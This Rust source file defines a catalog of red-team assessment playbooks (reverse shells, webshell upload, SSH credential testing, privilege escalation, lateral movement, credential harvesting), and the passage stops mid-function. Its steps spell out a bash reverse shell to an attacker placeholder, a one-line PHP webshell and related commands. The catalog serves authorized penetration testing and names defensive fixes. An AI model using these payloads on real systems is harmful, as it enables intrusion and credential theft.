/// Playbook Catalog
///
/// Pre-built playbooks for common Red Team scenarios.
/// All playbooks use human-friendly names - MITRE mappings are internal only.
///
/// ## Available Playbooks
///
/// ### Remote Access
/// - `reverse-shell-linux` - Establish reverse shell on Linux
/// - `reverse-shell-windows` - Establish reverse shell on Windows
/// - `webshell-upload` - Upload and execute webshell
///
/// ### Initial Access
/// - `web-app-assessment` - Full web application security assessment
/// - `external-footprint` - External attack surface mapping
/// - `ssh-bruteforce` - SSH credential testing
///
/// ### Privilege Escalation
/// - `linux-privesc` - Linux privilege escalation assessment
/// - `windows-privesc` - Windows privilege escalation assessment
///
/// ### Network
/// - `internal-network-recon` - Internal network reconnaissance
/// - `lateral-movement` - Lateral movement techniques
///
/// ### Data Collection
/// - `credential-harvesting` - Credential collection techniques
/// - `data-exfiltration` - Data extraction methods
use super::types::*;
use crate::scripts::FindingSeverity;

/// Get all available playbooks
pub fn all_playbooks() -> Vec<Playbook> {
    vec![
        // Remote Access Playbooks
        reverse_shell_linux(),
        reverse_shell_windows(),
        webshell_upload(),
        // Initial Access Playbooks
        web_app_assessment(),
        external_footprint(),
        ssh_credential_test(),
        // Privilege Escalation
        linux_privesc_assessment(),
        windows_privesc_assessment(),
        // Network Playbooks
        internal_recon(),
        lateral_movement_assessment(),
        // Data Collection
        credential_harvesting(),
    ]
}

/// Get a playbook by ID
pub fn get_playbook(id: &str) -> Option<Playbook> {
    all_playbooks().into_iter().find(|p| p.metadata.id == id)
}

/// Get playbooks by target type
pub fn playbooks_for_target(target: TargetType) -> Vec<Playbook> {
    all_playbooks()
        .into_iter()
        .filter(|p| p.metadata.target_types.contains(&target))
        .collect()
}

/// Get playbooks by risk level (and below)
pub fn playbooks_by_risk(max_risk: RiskLevel) -> Vec<Playbook> {
    all_playbooks()
        .into_iter()
        .filter(|p| p.metadata.risk_level <= max_risk)
        .collect()
}

/// Get playbooks by tag
pub fn playbooks_by_tag(tag: &str) -> Vec<Playbook> {
    let tag_lower = tag.to_lowercase();
    all_playbooks()
        .into_iter()
        .filter(|p| {
            p.metadata
                .tags
                .iter()
                .any(|t| t.to_lowercase() == tag_lower)
        })
        .collect()
}

// ============================================================================
// REMOTE ACCESS PLAYBOOKS
// ============================================================================

/// Reverse Shell Assessment - Linux
///
/// Simulates establishing a reverse shell on a Linux target.
/// Used to test: egress filtering, endpoint detection, shell execution monitoring.
pub fn reverse_shell_linux() -> Playbook {
    Playbook::new("reverse-shell-linux", "Reverse Shell Assessment (Linux)")
        .with_description("Assess ability to establish and maintain reverse shell access on Linux systems")
        .with_objective("Validate network egress controls and endpoint detection capabilities by attempting to establish outbound shell connections")
        .for_target(TargetType::Host)
        .for_os(TargetOS::Linux)
        .with_risk(RiskLevel::High)
        .with_duration("10-30 minutes")
        // Internal MITRE mapping (never shown to users)
        .with_mitre("T1059.004") // Command and Scripting Interpreter: Unix Shell
        .with_mitre("T1071.001") // Application Layer Protocol: Web Protocols
        .with_mitre("T1573.001") // Encrypted Channel: Symmetric Cryptography
        // Pre-conditions
        .add_precondition(
            PreCondition::new("Target system is reachable")
                .with_check("network-ping")
        )
        .add_precondition(
            PreCondition::new("Attack machine has listener capability")
                .with_notes("Ensure you have a machine to receive connections")
        )
        .add_precondition(
            PreCondition::new("Authorization for testing confirmed")
        )
        // Attack Flow - Step 1: Network Reconnaissance
        .add_step(
            PlaybookStep::new(1, PlaybookPhase::Recon, "Target Port Analysis")
                .with_description("Identify open ports and potential egress paths")
                .with_command("rb network ports scan <target> --preset full")
                .with_success("Open ports identified")
                .with_success("Outbound connectivity paths mapped")
                .on_fail(StepFailureAction::Abort)
                // Internal mapping
                .with_mitre("T1046", None) // Network Service Discovery
        )
        // Step 2: Egress Testing
        .add_step(
            PlaybookStep::new(2, PlaybookPhase::Recon, "Egress Path Discovery")
                .with_description("Test which ports allow outbound connections")
                .with_command("rb network trace run <attacker-ip>")
                .with_manual("Test common egress ports: 80, 443, 53, 8080")
                .with_success("At least one egress path identified")
                .depends(1)
                .with_mitre("T1046", None)
        )
        // Step 3: Listener Setup
        .add_step(
            PlaybookStep::new(3, PlaybookPhase::InitialAccess, "Prepare Listener")
                .with_description("Set up reverse shell listener on attack machine")
                .with_command("rb exploit payload listener nc <port>")
                .with_manual("Alternative: nc -lvnp <port>")
                .with_success("Listener active and waiting for connections")
                .with_mitre("T1571", None) // Non-Standard Port
        )
        // Step 4: Shell Execution
        .add_step(
            PlaybookStep::new(4, PlaybookPhase::Execution, "Execute Shell Payload")
                .with_description("Attempt to establish reverse shell connection")
                .with_command("rb exploit payload shell bash <attacker-ip> <port>")
                .with_command("rb exploit payload shell python <attacker-ip> <port>")
                .with_manual("If access exists, execute: bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1")
                .with_success("Shell connection established")
                .depends(3)
                .on_fail(StepFailureAction::Continue) // Try alternatives
                .with_mitre("T1059.004", None) // Unix Shell
        )
        // Step 5: Alternative Methods
        .add_step(
            PlaybookStep::new(5, PlaybookPhase::Execution, "Try Alternative Shells")
                .with_description("Attempt alternative reverse shell methods")
                .with_command("rb exploit payload shell perl <attacker-ip> <port>")
                .with_command("rb exploit payload shell php <attacker-ip> <port>")
                .with_manual("Try: perl, ruby, php, nc, socat, python variants")
                .with_success("Alternative shell method successful")
                .depends(4)
                .optional()
                .with_mitre("T1059", None) // Command and Scripting Interpreter
        )
        // Step 6: Connection Validation
        .add_step(
            PlaybookStep::new(6, PlaybookPhase::Execution, "Validate Shell Access")
                .with_description("Confirm shell functionality and gather basic info")
                .with_manual("Run: whoami, id, uname -a, pwd")
                .with_success("Shell commands execute successfully")
                .with_success("User context identified")
                .depends(4)
                .with_mitre("T1033", None) // System Owner/User Discovery
        )
        // Expected Evidence
        .add_evidence(
            ExpectedEvidence::new("Network connection established")
                .at("Listener terminal")
                .with_indicator("Incoming TCP connection from target IP")
                .severity(FindingSeverity::Critical)
        )
        .add_evidence(
            ExpectedEvidence::new("Command execution capability")
                .at("Shell session")
                .with_indicator("whoami returns username")
                .with_indicator("Commands execute without error")
                .severity(FindingSeverity::Critical)
        )
        // Controls that commonly fail
        .add_failed_control(
            FailedControl::new(
                "Egress Filtering",
                "Many networks allow outbound HTTP/HTTPS traffic without inspection"
            ).with_fix("Implement proxy-based egress filtering with SSL inspection")
        )
        .add_failed_control(
            FailedControl::new(
                "Endpoint Detection (EDR)",
                "Shell commands may not trigger detection if using common interpreters"
            ).with_fix("Enable behavioral analysis for command-line activity patterns")
        )
        .add_failed_control(
            FailedControl::new(
                "Network Detection (NIDS/NIPS)",
                "Encrypted shells bypass signature-based detection"
            ).with_fix("Deploy TLS inspection and anomaly detection for encrypted traffic")
        )
        // Variations
        .add_variation(
            PlaybookVariation::new(
                "Encrypted Shell",
                "Use when network monitoring is sophisticated"
            ).with_step(
                PlaybookStep::new(4, PlaybookPhase::Execution, "Encrypted Shell")
                    .with_description("Use SSL/TLS encrypted reverse shell")
                    .with_manual("Use ncat with SSL or socat with encryption")
                    .with_mitre("T1573.001", None) // Encrypted Channel
            )
        )
        .add_variation(
            PlaybookVariation::new(
                "DNS Tunnel",
                "Use when all direct outbound is blocked"
            ).with_step(
                PlaybookStep::new(4, PlaybookPhase::Execution, "DNS Exfil Shell")
                    .with_description("Tunnel shell traffic through DNS")
                    .with_manual("Use dnscat2 or iodine for DNS tunneling")
                    .with_mitre("T1071.004", None) // DNS Protocol
            )
        )
        // Kill Chain mapping (user-friendly)
        .with_kill_chain(vec![
            KillChainPhase::new("Reconnaissance", "Identify target and egress paths")
                .with_steps(&[1, 2]),
            KillChainPhase::new("Delivery", "Prepare and position payload")
                .with_steps(&[3]),
            KillChainPhase::new("Exploitation", "Execute payload to establish shell")
                .with_steps(&[4, 5]),
            KillChainPhase::new("Command & Control", "Validate and use shell access")
                .with_steps(&[6]),
        ])
}

/// Reverse Shell Assessment - Windows
pub fn reverse_shell_windows() -> Playbook {
    Playbook::new("reverse-shell-windows", "Reverse Shell Assessment (Windows)")
        .with_description("Assess ability to establish and maintain reverse shell access on Windows systems")
        .with_objective("Validate Windows endpoint detection and network security controls against shell-based access")
        .for_target(TargetType::Host)
        .for_os(TargetOS::Windows)
        .with_risk(RiskLevel::High)
        .with_duration("15-45 minutes")
        .with_mitre("T1059.001") // PowerShell
        .with_mitre("T1059.003") // Windows Command Shell
        .add_precondition(PreCondition::new("Target Windows system is reachable"))
        .add_precondition(PreCondition::new("Attack machine listener prepared"))
        .add_step(
            PlaybookStep::new(1, PlaybookPhase::Recon, "Target Port Analysis")
                .with_description("Scan for open ports and services")
                .with_command("rb network ports scan <target> --preset full")
                .with_success("Open ports identified")
                .with_mitre("T1046", None)
        )
        .add_step(
            PlaybookStep::new(2, PlaybookPhase::InitialAccess, "Prepare Listener")
                .with_description("Set up listener for reverse connection")
                .with_command("rb exploit payload listener nc <port>")
                .with_success("Listener active")
        )
        .add_step(
            PlaybookStep::new(3, PlaybookPhase::Execution, "PowerShell Reverse Shell")
                .with_description("Attempt PowerShell-based reverse shell")
                .with_command("rb exploit payload shell powershell <attacker-ip> <port>")
                .with_success("Shell connection established")
                .depends(2)
                .with_mitre("T1059.001", None)
        )
        .add_step(
            PlaybookStep::new(4, PlaybookPhase::Execution, "CMD Reverse Shell")
                .with_description("Try cmd.exe based reverse shell")
                .with_manual("If PowerShell blocked, try cmd.exe methods")
                .with_success("Alternative shell successful")
                .optional()
                .depends(2)
                .with_mitre("T1059.003", None)
        )
        .add_evidence(
            ExpectedEvidence::new("PowerShell connection")
                .at("Listener terminal")
                .with_indicator("Windows prompt visible")
                .severity(FindingSeverity::Critical)
        )
        .add_failed_control(
            FailedControl::new(
                "PowerShell Logging",
                "Script block logging may not be enabled or monitored"
            ).with_fix("Enable PowerShell Script Block Logging and Module Logging")
        )
        .add_failed_control(
            FailedControl::new(
                "AMSI (Antimalware Scan Interface)",
                "AMSI can be bypassed with various techniques"
            ).with_fix("Keep Windows Defender updated, use EDR with AMSI integration")
        )
}

/// Webshell Upload Assessment
pub fn webshell_upload() -> Playbook {
    Playbook::new("webshell-upload", "Webshell Upload Assessment")
        .with_description("Test web application file upload controls and webshell execution")
        .with_objective("Identify file upload vulnerabilities that could allow webshell deployment")
        .for_target(TargetType::WebApp)
        .for_os(TargetOS::Any)
        .with_risk(RiskLevel::High)
        .with_duration("20-60 minutes")
        .with_mitre("T1505.003") // Server Software Component: Web Shell
        .add_precondition(PreCondition::new("Target web application identified"))
        .add_precondition(PreCondition::new("File upload functionality present"))
        .add_step(
            PlaybookStep::new(1, PlaybookPhase::Recon, "Identify Upload Endpoints")
                .with_description("Locate file upload functionality")
                .with_command("rb web asset crawl <url>")
                .with_success("Upload endpoints identified")
                .with_mitre("T1595", None), // Active Scanning
        )
        .add_step(
            PlaybookStep::new(2, PlaybookPhase::Recon, "Analyze Upload Restrictions")
                .with_description("Determine file type and size restrictions")
                .with_manual("Test different file extensions: .php, .asp, .jsp, .php5")
                .with_success("Restriction bypass method identified"),
        )
        .add_step(
            PlaybookStep::new(3, PlaybookPhase::InitialAccess, "Upload Webshell")
                .with_description("Attempt to upload webshell payload")
                .with_manual("Upload minimal PHP webshell: <?php system($_GET['c']); ?>")
                .with_success("Webshell uploaded without error")
                .depends(2)
                .with_mitre("T1505.003", None),
        )
        .add_step(
            PlaybookStep::new(4, PlaybookPhase::Execution, "Execute Commands")
                .with_description("Test command execution through webshell")
                .with_manual("Access: http://<target>/<upload-path>/shell.php?c=whoami")
                .with_success("Commands execute and return output")
                .depends(3)
                .with_mitre("T1059", None),
        )
        .add_evidence(
            ExpectedEvidence::new("Webshell accessible")
                .at("Uploaded file path")
                .with_indicator("HTTP 200 response")
                .with_indicator("Command output returned")
                .severity(FindingSeverity::Critical),
        )
        .add_failed_control(
            FailedControl::new(
                "File Type Validation",
                "Server-side validation only checks extension, not content",
            )
            .with_fix("Implement content-type validation, use allowlist for file types"),
        )
        .add_failed_control(
            FailedControl::new(
                "Web Application Firewall",
                "WAF rules may not catch obfuscated webshells",
            )
            .with_fix("Update WAF rules, implement file upload scanning"),
        )
}

// ============================================================================
// INITIAL ACCESS PLAYBOOKS
// ============================================================================

/// Web Application Security Assessment
pub fn web_app_assessment() -> Playbook {
    Playbook::new("web-app-assessment", "Web Application Security Assessment")
        .with_description("Comprehensive security assessment of web applications")
        .with_objective(
            "Identify vulnerabilities in web applications including OWASP Top 10 issues",
        )
        .for_target(TargetType::WebApp)
        .for_os(TargetOS::Any)
        .with_risk(RiskLevel::Medium)
        .with_duration("2-4 hours")
        .with_mitre("T1190") // Exploit Public-Facing Application
        .add_precondition(PreCondition::new("Target URL identified"))
        .add_precondition(PreCondition::new("Authorization for web testing confirmed"))
        .add_step(
            PlaybookStep::new(1, PlaybookPhase::Recon, "Technology Fingerprinting")
                .with_description("Identify web server, framework, and technologies")
                .with_command("rb web asset headers <url>")
                .with_command("rb web asset fingerprint <url>")
                .with_script("http-headers")
                .with_success("Technology stack identified")
                .with_mitre("T1592", None), // Gather Victim Host Information
        )
        .add_step(
            PlaybookStep::new(2, PlaybookPhase::Recon, "Security Header Analysis")
                .with_description("Check security headers configuration")
                .with_command("rb web asset security <url>")
                .with_script("http-security")
                .with_success("Security headers analyzed"),
        )
        .add_step(
            PlaybookStep::new(3, PlaybookPhase::Recon, "TLS Configuration Audit")
                .with_description("Analyze TLS/SSL configuration")
                .with_command("rb tls security audit <host>")
                .with_success("TLS configuration documented"),
        )
        .add_step(
            PlaybookStep::new(4, PlaybookPhase::Discovery, "Directory Discovery")
                .with_description("Discover hidden directories and files")
                .with_command("rb web asset fuzz <url>")
                .with_success("Hidden paths discovered")
                .with_mitre("T1083", None), // File and Directory Discovery
        )
        .add_step(
            PlaybookStep::new(5, PlaybookPhase::Discovery, "Crawl Application")
                .with_description("Map application structure and endpoints")
                .with_command("rb web asset crawl <url>")
                .with_success("Application mapped"),
        )
        .add_step(
            PlaybookStep::new(6, PlaybookPhase::Discovery, "Parameter Discovery")
                .with_description("Identify input parameters for testing")
                .with_command("rb web asset params <url>")
                .with_success("Parameters identified"),
        )
        .add_step(
            PlaybookStep::new(7, PlaybookPhase::Discovery, "Vulnerability Scanning")
                .with_description("Scan for common web vulnerabilities")
                .with_command("rb web asset vuln-scan <url>")
                .with_script("http-vulns")
                .with_success("Vulnerability scan completed")
                .with_mitre("T1190", None), // Exploit Public-Facing Application
        )
        .add_evidence(
            ExpectedEvidence::new("Security header issues")
                .at("HTTP response headers")
                .with_indicator("Missing HSTS, CSP, X-Frame-Options")
                .severity(FindingSeverity::Medium),
        )
        .add_evidence(
            ExpectedEvidence::new("Outdated software")
                .at("Server headers, error pages")
                .with_indicator("Version numbers in headers")
                .severity(FindingSeverity::Medium),
        )
        .add_evidence(
            ExpectedEvidence::new("Injection vulnerabilities")
                .at("Input parameters")
                .with_indicator("Error messages, unexpected behavior")
                .severity(FindingSeverity::Critical),
        )
        .add_failed_control(
            FailedControl::new(
                "Input Validation",
                "Server-side validation may be insufficient or bypassable",
            )
            .with_fix("Implement strict input validation and parameterized queries"),
        )
}

/// External Footprint Discovery
pub fn external_footprint() -> Playbook {
    Playbook::new("external-footprint", "External Attack Surface Mapping")
        .with_description("Map the external attack surface of an organization")
        .with_objective("Discover all externally-facing assets, subdomains, and entry points")
        .for_target(TargetType::Domain)
        .for_os(TargetOS::Any)
        .with_risk(RiskLevel::Passive)
        .with_duration("30-90 minutes")
        .with_mitre("T1590") // Gather Victim Network Information
        .with_mitre("T1596") // Search Open Technical Databases
        .add_precondition(PreCondition::new("Target domain identified"))
        .add_step(
            PlaybookStep::new(1, PlaybookPhase::Recon, "WHOIS Lookup")
                .with_description("Gather domain registration information")
                .with_command("rb recon domain whois <domain>")
                .with_success("Registration info collected")
                .with_mitre("T1596.002", None), // WHOIS
        )
        .add_step(
            PlaybookStep::new(2, PlaybookPhase::Recon, "DNS Enumeration")
                .with_description("Enumerate DNS records")
                .with_command("rb dns record lookup <domain> --type ANY")
                .with_success("DNS records documented")
                .with_mitre("T1590.002", None), // DNS
        )
        .add_step(
            PlaybookStep::new(3, PlaybookPhase::Recon, "Subdomain Discovery")
                .with_description("Discover subdomains through multiple sources")
                .with_command("rb recon domain subdomains <domain>")
                .with_success("Subdomain list compiled")
                .with_mitre("T1596.001", None), // DNS/Passive DNS
        )
        .add_step(
            PlaybookStep::new(4, PlaybookPhase::Recon, "Certificate Transparency")
                .with_description("Search certificate logs for additional domains")
                .with_command("rb recon domain subdomains <domain> --ct-logs")
                .with_success("CT log domains identified"),
        )
        .add_step(
            PlaybookStep::new(5, PlaybookPhase::Discovery, "Resolve All Subdomains")
                .with_description("Resolve discovered subdomains to IPs")
                .with_command("rb dns record mass-resolve subdomains.txt")
                .with_success("IP addresses mapped")
                .depends(3),
        )
        .add_step(
            PlaybookStep::new(6, PlaybookPhase::Discovery, "Port Scan External Assets")
                .with_description("Scan discovered hosts for open ports")
                .with_command("rb network ports scan <hosts> --preset web")
                .with_success("Open ports identified")
                .depends(5)
                .with_mitre("T1046", None), // Network Service Discovery
        )
        .add_step(
            PlaybookStep::new(7, PlaybookPhase::Discovery, "Check for Subdomain Takeover")
                .with_description("Test for subdomain takeover vulnerabilities")
                .with_command("rb cloud asset takeover-scan subdomains.txt")
                .with_success("Takeover vulnerabilities documented")
                .depends(3),
        )
        .add_evidence(
            ExpectedEvidence::new("Untracked subdomains")
                .at("Subdomain enumeration results")
                .with_indicator("Domains not in official inventory")
                .severity(FindingSeverity::Medium),
        )
        .add_evidence(
            ExpectedEvidence::new("Subdomain takeover possible")
                .at("DNS CNAME records")
                .with_indicator("CNAME pointing to unclaimed resource")
                .severity(FindingSeverity::High),
        )
        .add_failed_control(
            FailedControl::new(
                "Asset Inventory",
                "Shadow IT and forgotten assets not tracked",
            )
            .with_fix("Implement continuous asset discovery and inventory management"),
        )
}

/// SSH Credential Testing
pub fn ssh_credential_test() -> Playbook {
    Playbook::new("ssh-credential-test", "SSH Credential Testing")
        .with_description("Test SSH authentication security and credential strength")
        .with_objective("Identify weak credentials and authentication misconfigurations")
        .for_target(TargetType::Host)
        .for_os(TargetOS::Linux)
        .with_risk(RiskLevel::High)
        .with_duration("15-60 minutes")
        .with_mitre("T1110") // Brute Force
        .add_precondition(PreCondition::new("SSH port (22) is accessible"))
        .add_precondition(PreCondition::new("Authorization for credential testing"))
        .add_step(
            PlaybookStep::new(1, PlaybookPhase::Recon, "SSH Banner Analysis")
                .with_description("Gather SSH version and configuration info")
                .with_command("rb network ports scan <target> --port 22")
                .with_script("ssh-banner")
                .with_success("SSH version identified")
                .with_mitre("T1592.002", None), // Software
        )
        .add_step(
            PlaybookStep::new(2, PlaybookPhase::InitialAccess, "Test Common Credentials")
                .with_description("Test common username/password combinations")
                .with_manual("Test: root/root, admin/admin, user/password, etc.")
                .with_success("Weak credentials identified")
                .depends(1)
                .with_mitre("T1110.001", None), // Password Guessing
        )
        .add_step(
            PlaybookStep::new(3, PlaybookPhase::InitialAccess, "Key-based Auth Check")
                .with_description("Check for key-based authentication issues")
                .with_manual("Test for: default keys, weak keys, agent forwarding")
                .with_success("Key auth issues documented")
                .depends(1)
                .with_mitre("T1552.004", None), // Private Keys
        )
        .add_evidence(
            ExpectedEvidence::new("Weak password accepted")
                .at("SSH authentication")
                .with_indicator("Login successful with common password")
                .severity(FindingSeverity::Critical),
        )
        .add_failed_control(
            FailedControl::new("Password Policy", "Weak or default passwords not prevented")
                .with_fix("Enforce strong password policy, disable password auth, require keys"),
        )
        .add_failed_control(
            FailedControl::new(
                "Brute Force Protection",
                "No rate limiting or account lockout",
            )
            .with_fix("Implement fail2ban or similar, enable rate limiting"),
        )
}

// ============================================================================
// PRIVILEGE ESCALATION PLAYBOOKS
// ============================================================================

/// Linux Privilege Escalation Assessment
pub fn linux_privesc_assessment() -> Playbook {
    Playbook::new("linux-privesc", "Linux Privilege Escalation Assessment")
        .with_description("Assess privilege escalation vectors on Linux systems")
        .with_objective(
            "Identify misconfigurations and vulnerabilities that allow privilege escalation",
        )
        .for_target(TargetType::Host)
        .for_os(TargetOS::Linux)
        .with_risk(RiskLevel::Medium)
        .with_duration("30-60 minutes")
        .with_mitre("T1068") // Exploitation for Privilege Escalation
        .add_precondition(PreCondition::new("Initial shell access obtained"))
        .add_precondition(PreCondition::new("Current user is non-root"))
        .add_step(
            PlaybookStep::new(1, PlaybookPhase::Discovery, "System Information")
                .with_description("Gather system and kernel information")
                .with_manual("Run: uname -a, cat /etc/os-release, arch")
                .with_success("System info collected")
                .with_mitre("T1082", None), // System Information Discovery
        )
        .add_step(
            PlaybookStep::new(2, PlaybookPhase::Discovery, "User Context Analysis")
                .with_description("Analyze current user privileges and groups")
                .with_manual("Run: id, groups, sudo -l")
                .with_success("User context documented")
                .with_mitre("T1033", None), // System Owner/User Discovery
        )
        .add_step(
            PlaybookStep::new(3, PlaybookPhase::Discovery, "SUID/SGID Binary Search")
                .with_description("Find potentially exploitable SUID/SGID binaries")
                .with_manual("Run: find / -perm -4000 -type f 2>/dev/null")
                .with_success("SUID binaries listed")
                .with_mitre("T1548.001", None), // Setuid and Setgid
        )
        .add_step(
            PlaybookStep::new(4, PlaybookPhase::Discovery, "Writable Path Analysis")
                .with_description("Check for writable system paths")
                .with_manual("Check: /etc/passwd, /etc/shadow permissions, cron directories")
                .with_success("Writable paths identified"),
        )
        .add_step(
            PlaybookStep::new(5, PlaybookPhase::Discovery, "Cron Job Analysis")
                .with_description("Analyze scheduled tasks for escalation vectors")
                .with_manual("Check: /etc/crontab, /etc/cron.*, user crontabs")
                .with_success("Cron jobs analyzed")
                .with_mitre("T1053.003", None), // Cron
        )
        .add_step(
            PlaybookStep::new(6, PlaybookPhase::PrivilegeEscalation, "Sudo Exploitation")
                .with_description("Attempt privilege escalation through sudo misconfiguration")
                .with_command("rb exploit payload privesc <target> --os linux --method sudo")
                .with_success("Sudo escalation successful")
                .depends(2)
                .with_mitre("T1548.003", None), // Sudo and Sudo Caching
        )
        .add_step(
            PlaybookStep::new(
                7,
                PlaybookPhase::PrivilegeEscalation,
                "Kernel Exploit Check",
            )
            .with_description("Check for applicable kernel exploits")
            .with_command("rb intel vuln search kernel <version>")
            .with_success("Potential kernel exploits identified")
            .depends(1)
            .with_mitre("T1068", None), // Exploitation for Privilege Escalation
        )
        .add_evidence(
            ExpectedEvidence::new("Sudo misconfiguration")
                .at("sudo -l output")
                .with_indicator("NOPASSWD entries for dangerous commands")
                .severity(FindingSeverity::High),
        )
        .add_evidence(
            ExpectedEvidence::new("Writable system files")
                .at("File system permissions")
                .with_indicator("Non-root writable /etc files")
                .severity(FindingSeverity::Critical),
        )
        .add_failed_control(
            FailedControl::new(
                "Sudo Configuration",
                "Overly permissive sudo rules allow escalation",
            )
            .with_fix("Apply least privilege to sudo rules, avoid NOPASSWD"),
        )
}

/// Windows Privilege Escalation Assessment
pub fn windows_privesc_assessment() -> Playbook {
    Playbook::new("windows-privesc", "Windows Privilege Escalation Assessment")
        .with_description("Assess privilege escalation vectors on Windows systems")
        .with_objective("Identify misconfigurations enabling local privilege escalation")
        .for_target(TargetType::Host)
        .for_os(TargetOS::Windows)
        .with_risk(RiskLevel::Medium)
        .with_duration("30-60 minutes")
        .with_mitre("T1068")
        .add_precondition(PreCondition::new("Initial shell access as standard user"))
        .add_step(
            PlaybookStep::new(1, PlaybookPhase::Discovery, "System Enumeration")
                .with_description("Gather Windows system information")
                .with_manual("Run: systeminfo, whoami /all, net user")
                .with_success("System info collected")
                .with_mitre("T1082", None),
        )
        .add_step(
            PlaybookStep::new(2, PlaybookPhase::Discovery, "Token Privileges Check")
                .with_description("Check for exploitable token privileges")
                .with_manual("Run: whoami /priv")
                .with_success("Token privileges documented")
                .with_mitre("T1134", None), // Access Token Manipulation
        )
        .add_step(
            PlaybookStep::new(3, PlaybookPhase::Discovery, "Service Permissions")
                .with_description("Check for misconfigured service permissions")
                .with_manual("Check service binaries and permissions")
                .with_success("Service misconfigs identified")
                .with_mitre("T1574.010", None), // Services File Permissions Weakness
        )
        .add_step(
            PlaybookStep::new(4, PlaybookPhase::Discovery, "Unquoted Service Paths")
                .with_description("Find unquoted service paths")
                .with_manual("Look for services with spaces in unquoted paths")
                .with_success("Unquoted paths documented")
                .with_mitre("T1574.009", None), // Path Interception by Unquoted Path
        )
        .add_step(
            PlaybookStep::new(5, PlaybookPhase::PrivilegeEscalation, "UAC Bypass")
                .with_description("Attempt UAC bypass techniques")
                .with_command("rb exploit payload privesc <target> --os windows --method uac")
                .with_success("UAC bypassed")
                .with_mitre("T1548.002", None), // Bypass User Account Control
        )
        .add_evidence(
            ExpectedEvidence::new("SeImpersonatePrivilege enabled")
                .at("whoami /priv output")
                .with_indicator("SeImpersonatePrivilege: Enabled")
                .severity(FindingSeverity::High),
        )
        .add_failed_control(
            FailedControl::new("UAC Configuration", "UAC set to lower security level")
                .with_fix("Set UAC to highest level, require credentials for elevation"),
        )
}

// ============================================================================
// NETWORK PLAYBOOKS
// ============================================================================

/// Internal Network Reconnaissance
pub fn internal_recon() -> Playbook {
    Playbook::new("internal-recon", "Internal Network Reconnaissance")
        .with_description("Reconnaissance of internal network after initial access")
        .with_objective("Map internal network, identify high-value targets and attack paths")
        .for_target(TargetType::Internal)
        .for_os(TargetOS::Any)
        .with_risk(RiskLevel::Medium)
        .with_duration("1-2 hours")
        .with_mitre("T1046")
        .add_precondition(PreCondition::new("Initial foothold on internal network"))
        .add_step(
            PlaybookStep::new(1, PlaybookPhase::Discovery, "Network Interface Analysis")
                .with_description("Identify network interfaces and subnets")
                .with_manual("Run: ip a, ifconfig, route -n")
                .with_success("Network topology understood")
                .with_mitre("T1016", None), // System Network Configuration Discovery
        )
        .add_step(
            PlaybookStep::new(2, PlaybookPhase::Discovery, "ARP Discovery")
                .with_description("Discover hosts via ARP")
                .with_command("rb network host discover <subnet>")
                .with_success("Active hosts identified")
                .with_mitre("T1018", None), // Remote System Discovery
        )
        .add_step(
            PlaybookStep::new(3, PlaybookPhase::Discovery, "Port Scanning")
                .with_description("Scan discovered hosts for services")
                .with_command("rb network ports scan <hosts> --preset common")
                .with_success("Services mapped")
                .depends(2)
                .with_mitre("T1046", None),
        )
        .add_step(
            PlaybookStep::new(4, PlaybookPhase::Discovery, "Domain Controller Discovery")
                .with_description("Identify domain controllers")
                .with_manual("Look for LDAP (389), Kerberos (88), DNS (53)")
                .with_success("Domain controllers identified")
                .depends(3)
                .with_mitre("T1018", None),
        )
        .add_step(
            PlaybookStep::new(5, PlaybookPhase::Discovery, "SMB Enumeration")
                .with_description("Enumerate SMB shares and services")
                .with_script("smb-info")
                .with_success("SMB shares documented")
                .depends(3)
                .with_mitre("T1135", None), // Network Share Discovery
        )
        .add_evidence(
            ExpectedEvidence::new("Domain controller identified")
                .at("Port scan results")
                .with_indicator("Ports 88, 389, 636, 3268 open")
                .severity(FindingSeverity::Info),
        )
        .add_failed_control(
            FailedControl::new(
                "Network Segmentation",
                "Flat network allows unrestricted lateral movement",
            )
            .with_fix("Implement network segmentation and micro-segmentation"),
        )
}

/// Lateral Movement Assessment
pub fn lateral_movement_assessment() -> Playbook {
    Playbook::new("lateral-movement", "Lateral Movement Assessment")
        .with_description("Test ability to move laterally within the network")
        .with_objective("Validate network segmentation and lateral movement detection")
        .for_target(TargetType::Internal)
        .for_os(TargetOS::Any)
        .with_risk(RiskLevel::High)
        .with_duration("1-3 hours")
        .with_mitre("T1021")
        .add_precondition(PreCondition::new("Credentials or access tokens available"))
        .add_precondition(PreCondition::new("Target systems identified"))
        .add_step(
            PlaybookStep::new(1, PlaybookPhase::LateralMovement, "SMB Lateral Movement")
                .with_description("Test SMB-based lateral movement")
                .with_command("rb exploit payload lateral --method smb <target>")
                .with_success("SMB access achieved")
                .with_mitre("T1021.002", None), // SMB/Windows Admin Shares
        )
        .add_step(
            PlaybookStep::new(2, PlaybookPhase::LateralMovement, "WinRM Movement")
                .with_description("Test WinRM-based access")
                .with_manual("Test: Enter-PSSession -ComputerName <target>")
                .with_success("WinRM access achieved")
                .with_mitre("T1021.006", None), // Windows Remote Management
        )
        .add_step(
            PlaybookStep::new(3, PlaybookPhase::LateralMovement, "SSH Movement")
                .with_description("Test SSH-based lateral movement")
                .with_command("rb exploit payload lateral --method ssh <target>")
                .with_success("SSH access achieved")
                .with_mitre("T1021.004", None), // SSH
        )
        .add_evidence(
            ExpectedEvidence::new("Cross-system access")
                .at("Remote system")
                .with_indicator("Shell access on different host")
                .severity(FindingSeverity::High),
        )
        .add_failed_control(
            FailedControl::new(
                "Credential Guard",
                "Credential Guard not enabled, allowing credential theft",
            )
            .with_fix("Enable Windows Credential Guard on all systems"),
        )
}

// ============================================================================
// DATA COLLECTION PLAYBOOKS
// ============================================================================

/// Credential Harvesting Assessment
pub fn credential_harvesting() -> Playbook {
    Playbook::new("credential-harvesting", "Credential Harvesting Assessment")
        .with_description("Assess credential exposure and harvesting vectors")
        .with_objective("Identify credentials stored insecurely or exposed in various locations")
        .for_target(TargetType::Host)
        .for_os(TargetOS::Any)
        .with_risk(RiskLevel::High)
        .with_duration("30-90 minutes")
        .with_mitre("T1552")
        .add_precondition(PreCondition::new("Shell access on target system"))
        .add_step(
            PlaybookStep::new(1, PlaybookPhase::Collection, "Config File Search")
                .with_description("Search for credentials in configuration files")
                .with_command("rb code secrets scan /")
                .with_success("Config files with credentials found")
                .with_mitre("T1552.001", None), // Credentials In Files
        )
        .add_step(
            PlaybookStep::new(2, PlaybookPhase::Collection, "Environment Variables")
                .with_description("Check for credentials in environment")
                .with_manual("Check: env, printenv, .bashrc, .profile")
                .with_success("Environment credentials documented")
                .with_mitre("T1552.001", None),
        )
        .add_step(
